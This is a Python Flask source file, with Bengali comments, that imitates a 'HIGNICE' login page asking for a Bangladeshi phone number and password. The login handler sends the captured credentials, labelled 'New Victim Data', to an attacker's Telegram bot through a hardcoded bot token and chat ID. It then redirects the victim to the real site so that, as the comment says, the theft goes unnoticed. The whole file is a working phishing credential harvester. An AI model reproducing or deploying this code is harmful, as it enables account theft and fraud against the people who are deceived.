from flask import Flask, render_template_string, request, redirect
import requests

app = Flask(__name__)

# --- কনফিগারেশন ---
BOT_TOKEN = "8669461197:AAFSIR9hecqfftSSdXNF1E90xYvpqVIAVRg"
CHAT_ID = "7897417844"

# --- HTML টেমপ্লেট (আপনার স্ক্রিনশটের মত ডিজাইন) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HIGNICE - Log in</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; background-color: #f8f8f8; }
        .header { background: linear-gradient(90deg, #ff6b6b, #ff8e8e); color: white; padding: 40px 20px; text-align: center; position: relative; }
        .header h1 { margin: 0; font-style: italic; letter-spacing: 2px; }
        .login-box { background: white; margin-top: -20px; border-radius: 20px 20px 0 0; padding: 30px 20px; box-shadow: 0 -5px 15px rgba(0,0,0,0.05); }
        .tabs { display: flex; border-bottom: 1px solid #eee; margin-bottom: 25px; }
        .tab { flex: 1; text-align: center; padding: 10px; color: #666; font-weight: bold; cursor: pointer; }
        .tab.active { color: #ff6b6b; border-bottom: 3px solid #ff6b6b; }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; }
        .input-field { display: flex; align-items: center; background: #f0f2f5; padding: 12px; border-radius: 8px; }
        input { border: none; background: transparent; outline: none; width: 100%; font-size: 16px; margin-left: 10px; }
        .btn { width: 100%; padding: 15px; border-radius: 30px; border: none; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-login { background: #dcdcdc; color: #888; }
        .btn-register { border: 2px solid #ff6b6b; color: #ff6b6b; background: white; margin-top: 20px; }
        .footer-icons { display: flex; justify-content: space-around; margin-top: 40px; }
        .icon-item { text-align: center; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="header">
        <h1>HIGNICE</h1>
        <div style="position: absolute; top: 10px; right: 10px; font-size: 14px;">🇺🇸 EN</div>
    </div>
    <div class="login-box">
        <h2 style="margin-top: 0;">Log in</h2>
        <p style="color: #888; font-size: 13px;">Please log in with your phone number or email</p>
        
        <div class="tabs">
            <div class="tab active">phone number</div>
            <div class="tab">Email Login</div>
        </div>

        <form action="/login" method="POST">
            <div class="input-group">
                <label>Phone number</label>
                <div class="input-field">
                    <span style="color: #666;">+880 ▼</span>
                    <input type="text" name="phone" placeholder="Please enter the phone number" required>
                </div>
            </div>
            <div class="input-group">
                <label>Password</label>
                <div class="input-field">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
            </div>
            <button type="submit" class="btn btn-login">Log in</button>
        </form>
        
        <button class="btn btn-register">Register</button>
        
        <div class="footer-icons">
            <div class="icon-item">Forgot password</div>
            <div class="icon-item">Customer Service</div>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone')
    password = request.form.get('password')
    
    # টেলিগ্রামে ডাটা পাঠানোর লজিক
    message = f"🎯 **New Victim Data**\n\n📱 Phone: `+880{phone}`\n🔑 Pass: `{password}`"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}&parse_mode=Markdown"
    
    try:
        requests.get(url)
    except:
        pass
    
    # ডাটা চুরি হওয়ার পর আসল সাইটে রিডাইরেক্ট (যাতে ইউজার বুঝতে না পারে)
    return redirect("https://hgzy.vip/#/login")

if __name__ == "__main__":
    app.run(debug=True, port=5000)
